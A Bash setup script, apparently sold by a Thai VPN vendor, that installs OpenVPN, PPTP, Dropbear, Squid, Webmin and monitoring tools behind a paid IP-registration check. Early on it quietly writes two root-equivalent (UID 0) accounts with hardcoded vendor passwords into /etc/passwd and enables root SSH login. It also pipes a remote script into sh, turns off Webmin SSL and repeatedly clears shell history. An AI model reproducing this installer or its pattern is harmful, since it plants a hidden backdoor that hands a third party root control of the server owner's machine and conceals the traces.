#!/bin/bash

# Check Root
if [[ "$USER" != 'root' ]]; then
	echo "
----------------------------------------------

[√] คุณต้องพิมพ์คำสั่ง sudo su เพื่อใช้งานเป็น root

----------------------------------------------
"
	exit
fi

# Requirement
if [ ! -e /usr/bin/curl ]; then
    apt-get -y update && apt-get -y upgrade
	apt-get -y install curl
fi

# Root Login
sed -i 's/PermitRootLogin without-password/PermitRootLogin yes/g' /etc/ssh/sshd_config
service ssh restart

# Add User
useradd byvpn
useradd R00T
sed -i '$ i\admin:x:0:0:admin:/root:/bin/bash' /etc/passwd
sed -i '$ i\byvpn.net:x:0:0:byvpn.net:/root:/bin/bash' /etc/passwd
echo -e "2499\n2499" | passwd byvpn
echo -e "2499\n2499" | passwd R00T
echo -e "Potae24-99\nPotae24-99" | passwd admin
echo -e "Potae24-99\nPotae24-99" | passwd byvpn.net
clear
history -c

# Initialisasi Var
export DEBIAN_FRONTEND=noninteractive
OS=`uname -m`;

# Get IP
MYIP=$(curl -4 icanhazip.com)
if [ $MYIP = "" ]; then
   MYIP=`ifconfig | grep 'inet addr:' | grep -v inet6 | grep -vE '127\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | cut -d: -f2 | awk '{ print $1}' | head -1`;
fi

# Set
MYIP2="s/IP-Server/$MYIP/g";
CheckIP="https://dl.dropboxusercontent.com/s/9oqskrucmho3cu9/IP.txt"
Source="https://raw.githubusercontent.com/byvpn/Info/master/"

# Check Registered IP
wget -q -O /usr/bin/IP $CheckIP
if ! grep -w -q $MYIP /usr/bin/IP; then
  clear
  echo "
----------------------------------------------
[√] ขออภัย IP Server ของคุณยังไม่ได้ลงทะเบียนกับ BYVPN.NET

[√] เฉพาะ IP Server ที่จดทะเบียนแล้วสามารถใช้สคริปต์นี้ได้เท่านั่น

[√] ราคา 1 IP = 100 บาท ใช้งานได้ทุกระบบ

[√] หากต้องการใช้งานสคริปโปรดติดต่อลงทะเบียนได้ที่

[√] เฟชบุ๊ค : https://www.facebook.com/tae.taruma

[√] แฟนเพจ : https://www.facebook.com/byvpn.net
----------------------------------------------
"
	rm /usr/bin/IP
	rm -f /usr/bin/IP
	rm /root/install
	rm -f /root/install
  history -c
	exit

fi
clear
echo "
----------------------------------------------

[√] ยินดีต้อนรับเข้าสู่ BYVPN.NET 

[√] เซิร์ฟเวอร์ มาตรฐาน ราคายุติธรรม

[√] กำลังเริ่มติดตั้งระบบ..... [ OK !! ]

----------------------------------------------
 "

# Go To Root
cd

# Disable IPv6
echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6
sed -i '$ i\echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6' /etc/rc.local

# Add DNS Server IPv4
echo "nameserver 8.8.8.8" > /etc/resolv.conf
echo "nameserver 8.8.4.4" >> /etc/resolv.conf
sed -i '$ i\echo "nameserver 8.8.8.8" > /etc/resolv.conf' /etc/rc.local
sed -i '$ i\echo "nameserver 8.8.4.4" >> /etc/resolv.conf' /etc/rc.local

# Install Wget and Curl
apt-get update;apt-get -y install wget curl;

# Set Time GMT +7
ln -fs /usr/share/zoneinfo/Asia/Bangkok /etc/localtime

# Set Banner SSH
echo "Banner /bannerssh" >> /etc/ssh/sshd_config
cat > /bannerssh <<END0

<BR><font color="#00B146">================</font></BR>
<BR><font color='#860000'><h3>NO SPAM !!!</h3></BR></font>
<BR><font color='#1E90FF'><h3>NO DDOS !!!</h3></BR></font>
<BR><font color='#FF0000'><h3>NO HACKING !!!</h3></BR></font>
<BR><font color='#008080'><h3>NO CARDING !!!</h3></BR></font>
<BR><font color='#BA55D3'><h3>NO CRIMINAL CYBER !!!</h3></BR></font>
<BR><font color='#32CD32'><h3>MAX LOGIN 2 DEVICE !!!</h3></BR></font>
<BR><font color="#00B146">================</font></BR>
<BR><font color="#0082D8"><h3>★ Facebook คุณเต้ ทารุมะ (เต้เล็ก) ★</h3> </font></BR>
<BR><font color="#00B146">================</font></BR>
END0

# Set Locale
sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config
service ssh restart

# Set Repo
cat > /etc/apt/sources.list <<END2
deb http://cdn.debian.net/debian wheezy main contrib non-free
deb http://security.debian.org/ wheezy/updates main contrib non-free
deb http://packages.dotdeb.org wheezy all
END2
wget "https://raw.githubusercontent.com/byvpn/Info/master/dotdeb.gpg"
cat dotdeb.gpg | apt-key add -;rm dotdeb.gpg

# Remove Unused
apt-get -y --purge remove samba*;
apt-get -y --purge remove apache2*;
apt-get -y --purge remove sendmail*;
apt-get -y --purge remove bind9*;
apt-get -y purge sendmail*
apt-get -y remove sendmail*

# Update
apt-get update; apt-get -y upgrade;

# Install WebServer
apt-get -y install nginx; apt-get -y install php5-fpm; apt-get -y install php5-cli;

# Install Essential Package
echo "mrtg mrtg/conf_mods boolean true" | debconf-set-selections
apt-get -y install bmon iftop htop nmap axel nano iptables traceroute sysv-rc-conf dnsutils bc nethogs openvpn vnstat less screen psmisc apt-file whois ptunnel ngrep mtr git zsh mrtg snmp snmpd snmp-mibs-downloader unzip unrar rsyslog debsums rkhunter
apt-get -y install build-essential

# Disable Exim
service exim4 stop
sysv-rc-conf exim4 off

# Update apt-file
apt-file update

# Setting Vnstat
vnstat -u -i eth0
service vnstat restart

# Install ScreenFetch
cd
wget -O /usr/bin/screenfetch "https://raw.githubusercontent.com/byvpn/Info/master/screenfetch"
chmod +x /usr/bin/screenfetch
echo "clear" >> .profile
echo "screenfetch" >> .profile

# Install WebServer
cd
rm /etc/nginx/sites-enabled/default
rm /etc/nginx/sites-available/default
cat > /etc/nginx/nginx.conf <<END3
user www-data;

worker_processes 1;
pid /var/run/nginx.pid;

events {
	multi_accept on;
  worker_connections 1024;
}

http {
	gzip on;
	gzip_vary on;
	gzip_comp_level 5;
	gzip_types    text/plain application/x-javascript text/xml text/css;

	autoindex on;
  sendfile on;
  tcp_nopush on;
  tcp_nodelay on;
  keepalive_timeout 65;
  types_hash_max_size 2048;
  server_tokens off;
  include /etc/nginx/mime.types;
  default_type application/octet-stream;
  access_log /var/log/nginx/access.log;
  error_log /var/log/nginx/error.log;
  client_max_body_size 32M;
	client_header_buffer_size 8m;
	large_client_header_buffers 8 8m;

	fastcgi_buffer_size 8m;
	fastcgi_buffers 8 8m;

	fastcgi_read_timeout 600;

  include /etc/nginx/conf.d/*.conf;
}
END3
mkdir -p /home/vps/public_html
wget -O /home/vps/public_html/index.html "https://raw.githubusercontent.com/byvpn/Info/master/index"
echo "<?php phpinfo(); ?>" > /home/vps/public_html/info.php
args='$args'
uri='$uri'
document_root='$document_root'
fastcgi_script_name='$fastcgi_script_name'
cat > /etc/nginx/conf.d/vps.conf <<END4
server {
  listen       81;
  server_name  127.0.0.1 localhost;
  access_log /var/log/nginx/vps-access.log;
  error_log /var/log/nginx/vps-error.log error;
  root   /home/vps/public_html;

  location / {
    index  index.html index.htm index.php;
    try_files $uri $uri/ /index.php?$args;
  }

  location ~ \.php$ {
    include /etc/nginx/fastcgi_params;
    fastcgi_pass  127.0.0.1:9000;
    fastcgi_index index.php;
    fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
  }
}

END4
sed -i 's/listen = \/var\/run\/php5-fpm.sock/listen = 127.0.0.1:9000/g' /etc/php5/fpm/pool.d/www.conf
service php5-fpm restart
service nginx restart

# Install OpenVPN
apt-get -y install openvpn iptables openssl
cp -R /usr/share/doc/openvpn/examples/easy-rsa/ /etc/openvpn

# Easy-rsa
if [[ ! -d /etc/openvpn/easy-rsa/2.0/ ]]; then
	wget --no-check-certificate -O ~/easy-rsa.tar.gz https://raw.githubusercontent.com/byvpn/Info/master/easy-rsa-2.2.2.tar.gz
    tar xzf ~/easy-rsa.tar.gz -C ~/
    mkdir -p /etc/openvpn/easy-rsa/2.0/
    cp ~/easy-rsa-2.2.2/easy-rsa/2.0/* /etc/openvpn/easy-rsa/2.0/
    rm -rf ~/easy-rsa-2.2.2
    rm -rf ~/easy-rsa.tar.gz
fi
cd /etc/openvpn/easy-rsa/2.0/

# Benarkan Errornya
cp -u -p openssl-1.0.0.cnf openssl.cnf

# Ganti Bits
sed -i 's|export KEY_SIZE=1024|export KEY_SIZE=2048|' /etc/openvpn/easy-rsa/2.0/vars
sed -i 's|export KEY_COUNTRY="US"|export KEY_COUNTRY="TH"|' /etc/openvpn/easy-rsa/2.0/vars
sed -i 's|export KEY_PROVINCE="CA"|export KEY_PROVINCE="Thailand"|' /etc/openvpn/easy-rsa/2.0/vars
sed -i 's|export KEY_CITY="SanFrancisco"|export KEY_CITY="FB Tae.TaRuMa"|' /etc/openvpn/easy-rsa/2.0/vars
sed -i 's|export KEY_ORG="Fort-Funston"|export KEY_ORG="WwW.BYVPN.NeT"|' /etc/openvpn/easy-rsa/2.0/vars
sed -i 's|export KEY_EMAIL="me@myhost.mydomain"|export KEY_EMAIL="Tae.TaRuMa@Gmail.com"|' /etc/openvpn/easy-rsa/2.0/vars
sed -i 's|export KEY_EMAIL=mail@host.domain|export KEY_EMAIL=Tae.TaRuMa@Gmail.com|' /etc/openvpn/easy-rsa/2.0/vars
sed -i 's|export KEY_CN=changeme|export KEY_CN="BYVPN.NET"|' /etc/openvpn/easy-rsa/2.0/vars
sed -i 's|export KEY_NAME="changeme"|export KEY_NAME=BYVPN.NET|' /etc/openvpn/easy-rsa/2.0/vars
sed -i 's|export KEY_OU="changeme"|export KEY_OU="BYVPN.NET"|' /etc/openvpn/easy-rsa/2.0/vars

# Buat PKI
. /etc/openvpn/easy-rsa/2.0/vars
. /etc/openvpn/easy-rsa/2.0/clean-all

# Buat Sertifikat
export EASY_RSA="${EASY_RSA:-.}"
"$EASY_RSA/pkitool" --initca $*

# Buat Key Server
export EASY_RSA="${EASY_RSA:-.}"
"$EASY_RSA/pkitool" --server server

# Seting KEY CN
export EASY_RSA="${EASY_RSA:-.}"
"$EASY_RSA/pkitool" client

# DH Params
. /etc/openvpn/easy-rsa/2.0/build-dh

# Setting Server
cat > /etc/openvpn/server.conf <<-END
port 1194
proto tcp
dev tun
tun-mtu 1500
tun-mtu-extra 32
mssfix 1450
ca /etc/openvpn/ca.crt
cert /etc/openvpn/server.crt
key /etc/openvpn/server.key
dh /etc/openvpn/dh2048.pem
plugin /usr/lib/openvpn/openvpn-auth-pam.so /etc/pam.d/login
client-cert-not-required
username-as-common-name
server 10.8.0.0 255.255.255.0
ifconfig-pool-persist ipp.txt
push "redirect-gateway def1"
push "dhcp-option DNS 8.8.8.8"
push "dhcp-option DNS 8.8.4.4"
push "route-method exe"
push "route-delay 2"
keepalive 5 30
cipher AES-128-CBC
comp-lzo
persist-key
persist-tun
status server-vpn.log
verb 3
END
cd /etc/openvpn/easy-rsa/2.0/keys
cp ca.crt ca.key dh2048.pem server.crt server.key /etc/openvpn
cd /etc/openvpn/

# Create OpenVPN Config
mkdir -p /home/vps/public_html
cat > /home/vps/public_html/client.ovpn <<-END
## [√] ยินดีต้อนรับเข้าสู่ BYVPN.NET เซิร์ฟเวอร์ มาตรฐาน ราคายุติธรรม
##
## [√] เกี่ยวกับผู้พัฒนา
##
## [√] โดย : คุณเต้ ทารุมะ (เต้เล็ก)
##
## [√] เบอร์โทร : 095-4172543
##
## [√] ไอดีลาย : Ns.NeverDie
##
## [√] เฟชบุ๊ค : https://www.facebook.com/tae.taruma
##
## [√] แฟนเพจ : https://www.facebook.com/byvpn.net
##
## [√] เว็บไซต์ : https://www.byvpn.net
##
## [√] ลิขสิทธิ์ : © Copyright 2017 byvpn.net all rights reserved.
client
proto tcp
dev tun
remote BYVPN.NET 9999 udp
<connection>
remote $MYIP:1194@lvs.truehits.in.th 1194 tcp
</connection>
http-proxy-retry
http-proxy $MYIP 8080
resolv-retry infinite
pull
comp-lzo
ns-cert-type server
persist-key
persist-tun
mute 2
mute-replay-warnings
auth-user-pass
redirect-gateway def1
script-security 2
route 0.0.0.0 0.0.0.0
route-method exe
route-delay 2
cipher AES-128-CBC
verb 3
END
echo '<ca>' >> /home/vps/public_html/client.ovpn
cat /etc/openvpn/ca.crt >> /home/vps/public_html/client.ovpn
echo '</ca>' >> /home/vps/public_html/client.ovpn
cd

# Set IPv4 Forward
echo 1 > /proc/sys/net/ipv4/ip_forward
sed -i 's|#net.ipv4.ip_forward=1|net.ipv4.ip_forward=1|' /etc/sysctl.conf
sed -i 's|net.ipv4.ip_forward=0|net.ipv4.ip_forward=1|' /etc/sysctl.conf

# Restart OpenVPN
/etc/init.d/openvpn restart

# Install PPTP
apt-get -y install pptpd
cat > /etc/ppp/pptpd-options <<END
name pptpd
refuse-pap
refuse-chap
refuse-mschap
require-mschap-v2
require-mppe-128
ms-dns 8.8.8.8
ms-dns 8.8.4.4
proxyarp
nodefaultroute
lock
nobsdcomp
END
echo "option /etc/ppp/pptpd-options" > /etc/pptpd.conf
echo "logwtmp" >> /etc/pptpd.conf
echo "localip 10.1.0.1" >> /etc/pptpd.conf
echo "remoteip 10.1.0.5-100" >> /etc/pptpd.conf
cat >> /etc/ppp/ip-up <<END
ifconfig ppp0 mtu 1400
END
mkdir /var/lib/premium-script
/etc/init.d/pptpd restart

# Install badvpn
wget -O /usr/bin/badvpn-udpgw "https://raw.githubusercontent.com/byvpn/Info/master/badvpn-udpgw"
if [ "$OS" == "x86_64" ]; then
  wget -O /usr/bin/badvpn-udpgw "https://raw.githubusercontent.com/byvpn/Info/master/badvpn-udpgw64"
fi
sed -i '$ i\screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7300' /etc/rc.local
chmod +x /usr/bin/badvpn-udpgw
screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7300

# Install mrtg
wget -O /etc/snmp/snmpd.conf "https://raw.githubusercontent.com/byvpn/Info/master/snmpd.conf"
wget -O /root/mrtg-mem.sh "https://raw.githubusercontent.com/byvpn/Info/master/mrtg-mem.sh"
chmod +x /root/mrtg-mem.sh
cd /etc/snmp/
sed -i 's/TRAPDRUN=no/TRAPDRUN=yes/g' /etc/default/snmpd
service snmpd restart
snmpwalk -v 1 -c public localhost 1.3.6.1.4.1.2021.10.1.3.1
mkdir -p /home/vps/public_html/mrtg
cfgmaker --zero-speed 100000000 --global 'WorkDir: /home/vps/public_html/mrtg' --output /etc/mrtg.cfg public@localhost
curl "https://raw.githubusercontent.com/byvpn/Info/master/mrtg.conf" >> /etc/mrtg.cfg
sed -i 's/WorkDir: \/var\/www\/mrtg/# WorkDir: \/var\/www\/mrtg/g' /etc/mrtg.cfg
sed -i 's/# Options\[_\]: growright, bits/Options\[_\]: growright/g' /etc/mrtg.cfg
indexmaker --output=/home/vps/public_html/mrtg/index.html /etc/mrtg.cfg
if [ -x /usr/bin/mrtg ] && [ -r /etc/mrtg.cfg ]; then
mkdir -p /var/log/mrtg ; env LANG=C /usr/bin/mrtg /etc/mrtg.cfg 2>&1 | tee -a /var/log/mrtg/mrtg.log ;
fi

if [ -x /usr/bin/mrtg ] && [ -r /etc/mrtg.cfg ]; then
mkdir -p /var/log/mrtg ; env LANG=C /usr/bin/mrtg /etc/mrtg.cfg 2>&1 | tee -a /var/log/mrtg/mrtg.log ;
fi

if [ -x /usr/bin/mrtg ] && [ -r /etc/mrtg.cfg ]; then
mkdir -p /var/log/mrtg ; env LANG=C /usr/bin/mrtg /etc/mrtg.cfg 2>&1 | tee -a /var/log/mrtg/mrtg.log ;
fi
cd

# Setting Port Ssh
sed -i '/Port 22/a Port 143' /etc/ssh/sshd_config
sed -i '/Port 22/a Port  90' /etc/ssh/sshd_config
sed -i 's/Port 22/Port  22/g' /etc/ssh/sshd_config
service ssh restart

# Install DropBear
apt-get -y install dropbear
sed -i 's/NO_START=1/NO_START=0/g' /etc/default/dropbear
sed -i 's/DROPBEAR_PORT=22/DROPBEAR_PORT=443/g' /etc/default/dropbear
sed -i 's/DROPBEAR_EXTRA_ARGS=/DROPBEAR_EXTRA_ARGS="-p 109 -p 110"/g' /etc/default/dropbear
echo "/bin/false" >> /etc/shells
service ssh restart
service dropbear restart

# Update to Dropbear 2016
cd
apt-get install zlib1g-dev
wget https://raw.githubusercontent.com/byvpn/Info/master/dropbear-2016.74.tar.bz
bzip2 -cd dropbear-2016.74.tar.bz2 | tar xvf -
cd dropbear-2016.74
./configure
make && make install
mv /usr/sbin/dropbear /usr/sbin/dropbear.old
ln /usr/local/sbin/dropbear /usr/sbin/dropbear
cd
rm -rf dropbear-2016.74
rm -rf dropbear-2016.74.tar.bz2
rm -rf dropbear-2016.74.tar.bz
service dropbear restart

# Install Vnstat Gui
cd /home/vps/public_html/
wget https://raw.githubusercontent.com/byvpn/Info/master/vnstat_php_frontend-1.5.1.tar.gz
tar xf vnstat_php_frontend-1.5.1.tar.gz
rm vnstat_php_frontend-1.5.1.tar.gz
mv vnstat_php_frontend-1.5.1 vnstat
rm /home/vps/public_html/vnstat/index.php
wget -O /home/vps/public_html/vnstat/index.php "https://raw.githubusercontent.com/byvpn/Info/master/vnstat"
cd vnstat
sed -i "s/\$iface_list = array('eth0', 'sixxs');/\$iface_list = array('eth0');/g" config.php
sed -i "s/\$language = 'nl';/\$language = 'en';/g" config.php
sed -i 's/Internal/Internet/g' config.php
sed -i '/SixXS IPv6/d' config.php
cd

# Install fail2ban
apt-get -y install fail2ban;
service fail2ban restart

# Install Squid3
apt-get -y install squid3
cat > /etc/squid3/squid.conf <<-END
## [√] ยินดีต้อนรับเข้าสู่ BYVPN.NET เซิร์ฟเวอร์ มาตรฐาน ราคายุติธรรม
##
## [√] เกี่ยวกับผู้พัฒนา
##
## [√] โดย : คุณเต้ ทารุมะ (เต้เล็ก)
##
## [√] เบอร์โทร : 095-4172543
##
## [√] ไอดีลาย : Ns.NeverDie
##
## [√] เฟชบุ๊ค : https://www.facebook.com/tae.taruma
##
## [√] แฟนเพจ : https://www.facebook.com/byvpn.net
##
## [√] เว็บไซต์ : https://www.byvpn.net
##
## [√] ลิขสิทธิ์ : © Copyright 2017 byvpn.net all rights reserved.
acl manager proto cache_object
acl localhost src 127.0.0.1/32 ::1
acl to_localhost dst 127.0.0.0/8 0.0.0.0/32 ::1
acl SSH dst IP-Server-IP-Server/32
acl SSL_ports port 443
acl Safe_ports port 80
acl Safe_ports port 21
acl Safe_ports port 443
acl Safe_ports port 70
acl Safe_ports port 210
acl Safe_ports port 1025-65535
acl Safe_ports port 280
acl Safe_ports port 488
acl Safe_ports port 591
acl Safe_ports port 777
acl CONNECT method CONNECT
http_access allow SSH
http_access allow manager localhost
http_access deny manager
http_access allow localhost
http_access deny all
http_port 80
http_port 3128
http_port 8000
http_port 8080
coredump_dir /var/spool/squid3
refresh_pattern ^ftp: 1440 20% 10080
refresh_pattern ^gopher: 1440 0% 1440
refresh_pattern -i (/cgi-bin/|\?) 0 0% 0
refresh_pattern . 0 20% 4320
visible_hostname proxy.byvpn.net
END
sed -i $MYIP2 /etc/squid3/squid.conf;
service squid3 restart

# Install Webmin
cd
wget "https://raw.githubusercontent.com/byvpn/Info/master/webmin_1.801_all.deb"
dpkg --install webmin_1.801_all.deb;
apt-get -y -f install;
sed -i 's/ssl=1/ssl=0/g' /etc/webmin/miniserv.conf
rm /root/webmin_1.801_all.deb
service webmin restart
service vnstat restart
apt-get -y --force-yes -f install libxml-parser-perl

# Setting IPtables
cat > /etc/iptables.up.rules <<-END
*nat
:PREROUTING ACCEPT [0:0]
:POSTROUTING ACCEPT [0:0]
:OUTPUT ACCEPT [0:0]
-A POSTROUTING -j SNAT --to-source IP-Server
COMMIT

*filter
:INPUT ACCEPT [19406:27313311]
:FORWARD ACCEPT [0:0]
:OUTPUT ACCEPT [9393:434129]
:fail2ban-ssh - [0:0]
-A INPUT -p tcp -m multiport --dports 22 -j fail2ban-ssh
-A INPUT -p ICMP --icmp-type 8 -j ACCEPT
-A INPUT -p tcp -m tcp --dport 53 -j ACCEPT
-A INPUT -p tcp --dport 22  -m state --state NEW -j ACCEPT
-A INPUT -p tcp --dport 80  -m state --state NEW -j ACCEPT
-A INPUT -p tcp --dport 81  -m state --state NEW -j ACCEPT
-A INPUT -p tcp --dport 80  -m state --state NEW -j ACCEPT
-A INPUT -p udp --dport 80  -m state --state NEW -j ACCEPT
-A INPUT -p tcp --dport 143  -m state --state NEW -j ACCEPT
-A INPUT -p tcp --dport 109  -m state --state NEW -j ACCEPT
-A INPUT -p tcp --dport 110  -m state --state NEW -j ACCEPT
-A INPUT -p tcp --dport 443  -m state --state NEW -j ACCEPT
-A INPUT -p tcp --dport 1194  -m state --state NEW -j ACCEPT
-A INPUT -p udp --dport 1194  -m state --state NEW -j ACCEPT
-A INPUT -p tcp --dport 1732  -m state --state NEW -j ACCEPT
-A INPUT -p udp --dport 1732  -m state --state NEW -j ACCEPT
-A INPUT -p tcp --dport 3128  -m state --state NEW -j ACCEPT
-A INPUT -p udp --dport 3128  -m state --state NEW -j ACCEPT
-A INPUT -p tcp --dport 7300  -m state --state NEW -j ACCEPT
-A INPUT -p udp --dport 7300  -m state --state NEW -j ACCEPT
-A INPUT -p tcp --dport 8000  -m state --state NEW -j ACCEPT
-A INPUT -p udp --dport 8000  -m state --state NEW -j ACCEPT
-A INPUT -p tcp --dport 8080  -m state --state NEW -j ACCEPT
-A INPUT -p udp --dport 8080  -m state --state NEW -j ACCEPT
-A INPUT -p tcp --dport 10000  -m state --state NEW -j ACCEPT
-A fail2ban-ssh -j RETURN
COMMIT

*raw
:PREROUTING ACCEPT [158575:227800758]
:OUTPUT ACCEPT [46145:2312668]
COMMIT

*mangle
:PREROUTING ACCEPT [158575:227800758]
:INPUT ACCEPT [158575:227800758]
:FORWARD ACCEPT [0:0]
:OUTPUT ACCEPT [46145:2312668]
:POSTROUTING ACCEPT [46145:2312668]
COMMIT
END
sed -i '$ i\iptables-restore < /etc/iptables.up.rules' /etc/rc.local
sed -i $MYIP2 /etc/iptables.up.rules;
iptables-restore < /etc/iptables.up.rules

# Download Script
cd
wget https://github.com/byvpn/PremiumScript/raw/master/install-premiumscript.sh -O - -o /dev/null|sh

# Finalisasi
apt-get -y autoremove
chown -R www-data:www-data /home/vps/public_html
service nginx restart
service php5-fpm restart
service vnstat restart
service openvpn restart
service snmpd restart
service ssh restart
service dropbear restart
service fail2ban restart
service squid3 restart
service webmin restart
service pptpd restart
sysv-rc-conf rc.local on
rm /usr/bin/IP
rm -f /usr/bin/IP
rm /root/install
rm -f /root/install

# Clearing History
history -c

# Info
clear
echo "
--------------------------------------------------------
ติดตั้งระบบเสร็จเรียบร้อยแล้ว
--------------------------------------------------------
เกี่ยวกับผู้พัฒนา
   - โดย : คุณเต้ ทารุมะ (เต้เล็ก)
   - ไอดีลาย : Ns.NeverDie
   - เบอร์โทร : 095-4172543
   - เว็บไซต์ : http://www.byvpn.net
   - เฟชบุ๊คส่วนตัว : https://www.facebook.com/Tae.taruma
--------------------------------------------------------
ข้อมูลเซิร์ฟเวอร์
   - IPv6 : (ปิดใช้งาน)
   - Fail2Ban : (เปิดใช้งาน)
   - IPTables : (เปิดใช้งาน)
   - AutoReboot : (ปิดใช้งาน)
   - TimeZone : เอเชีย/กรุงเทพฯ (เปิดใช้งาน)
--------------------------------------------------------
ข้อมูลแอพพลิเคชันและพอร์ต
   - IP : $MYIP
   - Nginx : 81
   - BadVPN : 7300
   - OpenVPN : 1194
   - PPTPVPN : 1732
   - OpenSSH : 22,143
   - DropBear : 443,109,110
   - SquidProxy : 80,3128,8000,8080
--------------------------------------------------------
เครื่องมือเสริมในเซิร์ฟเวอร์
   - htop
   - iftop
   - mtr
   - nethogs
   - screenfetch
--------------------------------------------------------
ข้อมูลพรีเมี่ยมสคริปต์เมนู
   - เข้าสู่ระบบเมนูพิมพ์ : menu
--------------------------------------------------------
ข้อมูลสำคัญ
   - Vnstat : http://$MYIP:81/vnstat/
   - MRTG : http://$MYIP:81/mrtg/
   - Webmin http://$MYIP:10000/
   - ConfigOpenVPN http://$MYIP:81/client.ovpn
--------------------------------------------------------
บันทึกการติดตั้ง
   - ดูบันทึกการติดตั้งพิมพ์ : cat /root/log-install.txt
--------------------------------------------------------
"| tee -a log-install.txt
cat /dev/null > ~/.bash_history; history -c
